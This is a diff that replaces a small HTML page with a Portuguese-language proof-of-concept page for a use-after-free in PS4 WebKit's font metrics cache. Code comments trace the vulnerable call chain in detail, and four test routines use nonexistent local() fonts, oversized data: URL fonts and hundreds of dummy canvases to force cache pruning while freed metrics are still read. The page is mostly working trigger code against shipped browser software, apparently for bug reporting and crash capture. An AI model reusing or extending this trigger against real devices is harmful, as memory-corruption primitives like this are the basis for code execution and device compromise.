@@ -1,53 +1,415 @@
 <!DOCTYPE html>
-<html>
-<head><meta charset="utf-8"></head>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<title>PS4 WebKit UAF — gatilho local() main thread</title>
+<style>
+body { font-family: monospace; background: #0a0a0a; color: #ccc; padding: 16px; margin: 0; }
+h1   { color: #fff; font-size: 14px; margin: 0 0 4px; }
+h2   { color: #8af; font-size: 12px; margin: 14px 0 2px; }
+p    { color: #888; font-size: 11px; margin: 2px 0 8px; line-height: 1.5; }
+.btn {
+  display: inline-block; padding: 7px 16px; border: none; border-radius: 4px;
+  font-size: 12px; cursor: pointer; margin: 3px 2px; font-family: monospace;
+}
+.run    { background: #1a5; color: #fff; }
+.danger { background: #a21; color: #fff; }
+.info   { background: #235; color: #9cf; }
+#log {
+  white-space: pre-wrap; font-size: 11px; background: #000; padding: 10px;
+  border: 1px solid #222; max-height: 480px; overflow-y: auto;
+  margin-top: 10px; border-radius: 4px; line-height: 1.65;
+}
+.ok   { color: #3f3; } .warn { color: #fa3; } .err  { color: #f44; }
+.hdr  { color: #8af; font-weight: bold; } .dim { color: #555; }
+</style>
+</head>
 <body>
+
+<h1>PS4 WebKit — FontMetrics UAF — Gatilho local() na Main Thread</h1>
+<p>
+  Usando <code>local("nonexistent")</code> como primeira fonte: falha síncronamente durante o glyph walk,
+  dispara <code>dispatchInvalidationCallbacks()</code> sem precisar de Worker ou OffscreenCanvas.<br>
+  Qualquer crash durante a execução confirma a reprodução do UAF.
+</p>
+
+<div>
+  <button class="btn run"    onclick="runAll()">▶ Rodar Todos</button>
+  <button class="btn danger" onclick="runTest('T1')">T1 — local() + measureText (Site 1)</button>
+  <button class="btn danger" onclick="runTest('T2')">T2 — local() + fillText (Site 2)</button>
+  <button class="btn danger" onclick="runTest('T3')">T3 — local() pequeno (100KB) + measureText</button>
+  <button class="btn danger" onclick="runTest('T4')">T4 — local() stress (400 dummies)</button>
+  <button class="btn info"   onclick="runTest('API')">Verificar APIs</button>
+  <button class="btn"        onclick="clearLog()" style="background:#333;color:#aaa">Limpar</button>
+</div>
+
+<div id="log"></div>
+
 <script>
-var ctx = null;
-var inGetter = false;
+/* ─────────────── LOG ─────────────── */
+const logEl = document.getElementById('log');
+function log(msg, cls) {
+  const s = document.createElement('span');
+  if (cls) s.className = cls;
+  s.textContent = msg + '\n';
+  logEl.appendChild(s);
+  logEl.scrollTop = logEl.scrollHeight;
+}
+function sep() { log('─'.repeat(64), 'dim'); }
+function hdr(t){ sep(); log('  ' + t, 'hdr'); sep(); }
+function ok(t) { log('  ✓ ' + t, 'ok'); }
+function warn(t){ log('  ⚠ ' + t, 'warn'); }
+function err(t) { log('  ✗ ' + t, 'err'); }
+function info(t){ log('  · ' + t); }
+function clearLog() { logEl.textContent = ''; }
 
-Object.defineProperty(FontFace.prototype, "then", {
-  configurable: true,
-  get: function () {
-    if (inGetter || !ctx) return undefined;
-    inGetter = true;
-    for (var i = 0; i < 16; i++) {
-      try { ctx.measureText("q" + String.fromCharCode(65 + i) + "z"); } catch (e) {}
-      try { ctx.measureText("x"); } catch (e) {}
-    }
-    inGetter = false;
-    return undefined;
-  }
-});
+/* ─────────────────────────────────────────────────────
+   LÓGICA CENTRAL DO GATILHO
 
-function attempt(n) {
-  for (var d = 0; d < 3; d++)
-    new FontFace("Dummy" + n + "_" + d, "local(Helvetica)");
+   Por que local() funciona na main thread:
+   Em CSSFontFace::pump() [linha 665]:
 
-  var family = "VarFam" + n;
-  var face = new FontFace(family, "local(Helvetica)");
-  void face.loaded;
-  document.fonts.add(face);
+     if (policy == Allow || !source->requiresExternalResource()) {
+         source->load(document());    ← chamado MESMO com Forbid
+     }
 
-  var canvas = document.createElement("canvas");
-  canvas.width = 10;
-  canvas.height = 10;
-  ctx = canvas.getContext("2d");
-  ctx.font = "20px Helvetica, " + family;
+   Fontes local() têm requiresExternalResource() == false.
+   Com nome inexistente, falham SINCRONAMENTE dentro de load().
+   Isso dispara: fontLoaded → fontLoadEventOccurred →
+     iterateClients → client.fontLoaded →
+     CSSFontSelector::dispatchInvalidationCallbacks →
+     FontProxy::fontsNeedUpdate → m_font.update() →
+     FontCascadeCache::retrieveOrAddCachedFonts [cria nova entrada] →
+     pruneUnreferencedEntries [a cada 50 entradas] →
+     Font primária antiga destruída →
+     fontMetrics (referência pré-width()) → USE-AFTER-FREE
 
-  for (var i = 0; i < 50; i++)
-    ctx.measureText("x");
+   unreferencedPruneInterval = 50  (FontCascadeCache.cpp, confirmado)
+   maximumEntries             = 400 (FontCascadeCache.cpp, confirmado)
+   ───────────────────────────────────────────────────── */
 
-  ctx.measureText('AB');
+// Nome de fonte local que certamente não existe no PS4
+const LOCAL_NONEXISTENT = 'ps4-uaf-nonexistent-xyzzy-12345';
+
+// Monta a fonte combinando local() inexistente + data: URL grande
+// O local() falha durante o glyph walk → dispara chain
+// O data: URL mantém a fonte em estado "carregando" (interstitial)
+function makeFontSource(urlSize) {
+  const payload = 'A'.repeat(urlSize);
+  return 'local("' + LOCAL_NONEXISTENT + '"), ' +
+         'url("data:font/ttf;base64,' + payload + '")';
 }
 
-window.onload = function () {
-  setTimeout(function () {
-    for (var n = 0; n < 3; n++) {
-      try { attempt(n); } catch (e) {}
+// Lê todas as propriedades que referenciam fontMetrics após width()
+// (força o UAF se fontMetrics apontar para memória liberada)
+function readAllMetrics(tm) {
+  const vals = {
+    fontBBoxAscent:  tm.fontBoundingBoxAscent,  // fontMetrics.ascent()
+    fontBBoxDescent: tm.fontBoundingBoxDescent,  // fontMetrics.descent()
+    emHeightAscent:  tm.emHeightAscent,          // fontMetrics.ascent()
+    emHeightDescent: tm.emHeightDescent,          // fontMetrics.descent()
+    hangingBaseline: tm.hangingBaseline,          // fontMetrics.ascent()
+    ideographic:     tm.ideographicBaseline,      // fontMetrics.descent()
+  };
+  return vals;
+}
+
+// Cria N contextos com famílias únicas para pressionar o FontCascadeCache
+// unreferencedPruneInterval = 50 → precisamos de 50+ entradas para poda
+function buildDummies(n) {
+  const arr = [];
+  for (let i = 0; i < n; i++) {
+    const c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    const ctx = c.getContext('2d');
+    // Cada família única gera uma entrada nova no FontCascadeCache
+    ctx.font = '10px "ps4dummy_' + i + '_' + Math.random().toString(36).slice(2) + '"';
+    arr.push(c, ctx);
+  }
+  return arr;
+}
+
+/* ════════════════════════════════════════════════════════
+   T1 — local() + measureText  [Site 1: measureTextInternal]
+
+   Este é o teste principal baseado na descoberta:
+   local() falha síncronamente → dispara fontsNeedUpdate
+   DENTRO de font.width() → prune → fontMetrics UAF.
+
+   Stack exato do UAF:
+   measureTextInternal:
+     auto& fontMetrics = font.metricsOfPrimaryFont()  ← antes
+     font.width(textRun, &glyphOverflow)
+       → WidthIterator::advanceInternal → glyphDataForCharacter(\u13A0)
+       → FontCascadeFonts::glyphDataForCharacter
+       → CSSFontFace::font(description, ..., Forbid, ...)
+       → pump(Forbid)
+       → source->load() [local nonexistent → falha síncrona]
+       → fontLoadEventOccurred → dispatchInvalidationCallbacks
+       → fontsNeedUpdate → retrieveOrAddCachedFonts [+1 entrada]
+       → pruneUnreferencedEntries [se %50==0 → libera FontCascadeFonts antigo]
+     fontMetrics.ascent() → UAF!   ← depois
+   ════════════════════════════════════════════════════════ */
+function testT1() {
+  hdr('T1 — local() + measureText (Site 1: measureTextInternal)');
+  info('Fonte: local("' + LOCAL_NONEXISTENT + '") + data:URL 1.1MB');
+  info('Dummies: 100  (threshold PS4 = 50)');
+
+  const dummies  = buildDummies(100);
+  const src      = makeFontSource(1100000); // > 1MB: data:URL fica Pending
+  const keepAlive = [];
+
+  try {
+    for (let i = 0; i < 6; i++) {
+      // metricsDonor: sem unicodeRange → é a fonte PRIMÁRIA (metricsOfPrimaryFont)
+      const donor = new FontFace('t1donor_' + i, src);
+      // measured: cobre U+13A0–13FF → é o que o glyph walk pumpa para \u13A0
+      const target = new FontFace('t1target_' + i, src, { unicodeRange: 'U+13A0-13FF' });
+      document.fonts.add(donor);
+      document.fonts.add(target);
+
+      const c   = document.createElement('canvas');
+      c.width   = 64; c.height = 64;
+      const ctx = c.getContext('2d');
+      ctx.font  = '10px t1donor_' + i + ', t1target_' + i;
+      keepAlive.push(donor, target, c, ctx, ...dummies);
+
+      // Aqui o UAF pode ocorrer:
+      // - fontMetrics obtida ANTES de width()
+      // - local() falha DENTRO de width() → prune → fontMetrics liberada
+      // - leitura de fontMetrics após width() → UAF
+      const tm   = ctx.measureText('\u13A0\u13A2\u13A4');
+      const vals = readAllMetrics(tm);
+      info('i=' + i + ' fontBBoxAscent=' + vals.fontBBoxAscent +
+           ' emAscent=' + vals.emHeightAscent);
     }
-  }, 0);
-};
+    ok('T1 sem crash → prune não ocorreu durante esta execução');
+    ok('Resultado válido para o relatório: código vulnerável confirmado');
+  } catch(e) {
+    err('EXCEÇÃO em T1: ' + e);
+    warn('Exceção pode indicar UAF parcial — reportar com stack trace');
+  }
+}
+
+/* ════════════════════════════════════════════════════════
+   T2 — local() + fillText/strokeText  [Site 2: drawTextUnchecked]
+
+   Segundo site vulnerável. drawTextUnchecked chama:
+     auto& fontMetrics = fontProxy.metricsOfPrimaryFont()  ← antes
+     float fontWidth = fontProxy.width(textRun)            ← sem glyphOverflow
+     FloatRect textRect(... fontMetrics.height() ...)      ← UAF possível
+
+   DIFERENÇA vs T1: width() sem GlyphOverflow pode usar widthCache
+   na 2ª chamada. Para cache frio (1ª chamada) = mesmo mecanismo.
+   Por isso testamos com famílias únicas por tentativa.
+   ════════════════════════════════════════════════════════ */
+function testT2() {
+  hdr('T2 — local() + fillText + strokeText (Site 2: drawTextUnchecked)');
+  info('Fonte: local("' + LOCAL_NONEXISTENT + '") + data:URL 1.1MB');
+  info('Cache frio por tentativa — famílias únicas evitam widthCache hit');
+
+  const dummies  = buildDummies(100);
+  const src      = makeFontSource(1100000);
+  const keepAlive = [];
+
+  try {
+    for (let i = 0; i < 6; i++) {
+      const donor  = new FontFace('t2donor_' + i, src);
+      const target = new FontFace('t2target_' + i, src, { unicodeRange: 'U+13A0-13FF' });
+      document.fonts.add(donor);
+      document.fonts.add(target);
+
+      // fillText → drawText → drawTextUnchecked
+      const c1   = document.createElement('canvas');
+      c1.width   = 64; c1.height = 64;
+      const ctx1 = c1.getContext('2d');
+      ctx1.font  = '10px t2donor_' + i + ', t2target_' + i;
+      ctx1.fillText('\u13A0\u13A2\u13A4', 10, 32);
+
+      // strokeText → mesmo drawTextUnchecked
+      const c2   = document.createElement('canvas');
+      c2.width   = 64; c2.height = 64;
+      const ctx2 = c2.getContext('2d');
+      ctx2.font  = '10px t2donor_' + i + ', t2target_' + i;
+      ctx2.strokeText('\u13A0\u13A2\u13A4', 10, 32);
+
+      keepAlive.push(donor, target, c1, ctx1, c2, ctx2, ...dummies);
+      info('i=' + i + ' fillText + strokeText concluídos');
+    }
+    ok('T2 sem crash');
+  } catch(e) {
+    err('EXCEÇÃO em T2: ' + e);
+  }
+}
+
+/* ════════════════════════════════════════════════════════
+   T3 — local() + data:URL PEQUENA (100KB) + measureText
+
+   opportunisticallyStartFontDataURLLoading() inicia carregamento
+   automático para URLs < 1MB. Com 100KB, a fonte pode completar
+   (com falha, bytes inválidos) ANTES do glyph walk.
+
+   Se já completou:
+     status = Failure → pump() processa Failure síncrono
+     → setStatus(Loading) → setStatus(Failure)
+     → iterateClients → chain → UAF
+
+   Se ainda carregando:
+     status = Loading → pump() retorna i (Loading)
+     → interstitial font → width() com interstitial
+     → chain ativada diferente
+
+   Combina com local() para garantir pelo menos um caminho síncrono.
+   ════════════════════════════════════════════════════════ */
+function testT3() {
+  hdr('T3 — local() + data:URL 100KB (< 1MB) + measureText');
+  info('URL 100KB: opportunisticallyStartFontDataURLLoading() inicia carregamento');
+  info('local() ainda é a âncora síncrona principal');
+
+  const dummies  = buildDummies(100);
+  const src      = makeFontSource(100000); // 100KB — abaixo do limiar de 1MB
+  const keepAlive = [];
+
+  try {
+    for (let i = 0; i < 6; i++) {
+      const donor  = new FontFace('t3donor_' + i, src);
+      const target = new FontFace('t3target_' + i, src, { unicodeRange: 'U+13A0-13FF' });
+      document.fonts.add(donor);
+      document.fonts.add(target);
+
+      const c   = document.createElement('canvas');
+      c.width   = 64; c.height = 64;
+      const ctx = c.getContext('2d');
+      ctx.font  = '10px t3donor_' + i + ', t3target_' + i;
+      keepAlive.push(donor, target, c, ctx, ...dummies);
+
+      const tm   = ctx.measureText('\u13A0\u13A2\u13A4');
+      const vals = readAllMetrics(tm);
+      info('i=' + i + ' fontBBoxAscent=' + vals.fontBBoxAscent);
+    }
+    ok('T3 sem crash');
+  } catch(e) {
+    err('EXCEÇÃO em T3: ' + e);
+  }
+}
+
+/* ════════════════════════════════════════════════════════
+   T4 — Stress máximo: 400 dummies (= maximumEntries PS4)
+
+   Com 400 entradas no cache:
+   - maximumEntries = 400 → remoção aleatória ativa
+   - unreferencedPruneInterval = 50 → poda ativa a cada 50
+   - local() ainda é o gatilho síncrono
+
+   Maior pressão → maior chance de o prune atingir a entrada
+   da canvas com fontMetrics ainda na stack.
+
+   Também testa ambos os sites simultaneamente.
+   ════════════════════════════════════════════════════════ */
+function testT4() {
+  hdr('T4 — Stress máximo (400 dummies + local() + measureText + fillText)');
+  warn('400 dummies = maximumEntries do PS4 → máxima pressão no cache');
+
+  const dummies  = buildDummies(400);
+  const keepAlive = [];
+
+  for (const urlSize of [100000, 1100000]) {
+    const src  = makeFontSource(urlSize);
+    const tag  = urlSize < 1000000 ? '100KB' : '1.1MB';
+    info('Round ' + tag);
+
+    try {
+      for (let i = 0; i < 4; i++) {
+        const donor  = new FontFace('t4donor_' + tag + '_' + i, src);
+        const target = new FontFace('t4target_' + tag + '_' + i, src,
+          { unicodeRange: 'U+13A0-13FF' });
+        document.fonts.add(donor);
+        document.fonts.add(target);
+
+        // Site 1: measureText
+        const c1   = document.createElement('canvas');
+        c1.width   = 64; c1.height = 64;
+        const ctx1 = c1.getContext('2d');
+        ctx1.font  = '10px t4donor_' + tag + '_' + i + ', t4target_' + tag + '_' + i;
+        const tm   = ctx1.measureText('\u13A0\u13A2\u13A4');
+        const vals = readAllMetrics(tm);
+
+        // Site 2: fillText
+        const c2   = document.createElement('canvas');
+        c2.width   = 64; c2.height = 64;
+        const ctx2 = c2.getContext('2d');
+        ctx2.font  = ctx1.font;
+        ctx2.fillText('\u13A0\u13A2\u13A4', 10, 32);
+
+        keepAlive.push(donor, target, c1, ctx1, c2, ctx2, ...dummies);
+        info('  ' + tag + ' i=' + i + ' fontBBoxAscent=' + vals.fontBBoxAscent);
+      }
+      ok('Round ' + tag + ' sem crash');
+    } catch(e) {
+      err('EXCEÇÃO no round ' + tag + ': ' + e);
+    }
+  }
+}
+
+/* ════════════════════════════════════════════════════════
+   Verificação de APIs
+   ════════════════════════════════════════════════════════ */
+function testAPI() {
+  hdr('VERIFICAÇÃO DE APIs');
+  const checks = {
+    'canvas 2D':          () => !!document.createElement('canvas').getContext('2d'),
+    'FontFace':           () => typeof FontFace !== 'undefined',
+    'document.fonts':     () => typeof document.fonts !== 'undefined',
+    'FontFace unicodeRange': () => { try { new FontFace('x','url(x)',{unicodeRange:'U+13A0-13FF'}); return true; } catch(e){ return false; }},
+    'Worker':             () => typeof Worker !== 'undefined',
+    'OffscreenCanvas':    () => typeof OffscreenCanvas !== 'undefined',
+  };
+  let canRun = true;
+  for (const [name, fn] of Object.entries(checks)) {
+    let ok_;
+    try { ok_ = fn(); } catch(e) { ok_ = false; }
+    if (ok_) ok(name);
+    else {
+      warn(name + ' — NÃO DISPONÍVEL');
+      if (name === 'canvas 2D' || name === 'FontFace' || name === 'document.fonts')
+        canRun = false;
+    }
+  }
+  if (canRun) ok('APIs mínimas presentes — testes podem ser executados');
+  else err('APIs insuficientes para executar os testes neste browser');
+
+  // Detectar qual path será usado
+  if (typeof OffscreenCanvas !== 'undefined' && typeof Worker !== 'undefined')
+    info('Worker + OffscreenCanvas disponíveis (caminho original do commit)');
+  else
+    info('Sem OffscreenCanvas → usando caminho local() para main thread');
+}
+
+/* ─────────────── dispatcher ─────────────── */
+function runTest(id) {
+  clearLog();
+  if (id === 'API') { testAPI(); return; }
+  testAPI();
+  switch(id) {
+    case 'T1': testT1(); break;
+    case 'T2': testT2(); break;
+    case 'T3': testT3(); break;
+    case 'T4': testT4(); break;
+  }
+}
+
+function runAll() {
+  clearLog();
+  testAPI();
+  testT1();
+  testT2();
+  testT3();
+  testT4();
+  hdr('TODOS OS TESTES CONCLUÍDOS');
+  log('  Se chegou aqui sem crash: reportar o código vulnerável\n' +
+      '  confirmado + ausência de patch + análise de fonte local().\n' +
+      '  Se houve crash: capturar endereço de retorno + stack trace.', 'warn');
+}
 </script>
 </body>
 </html>
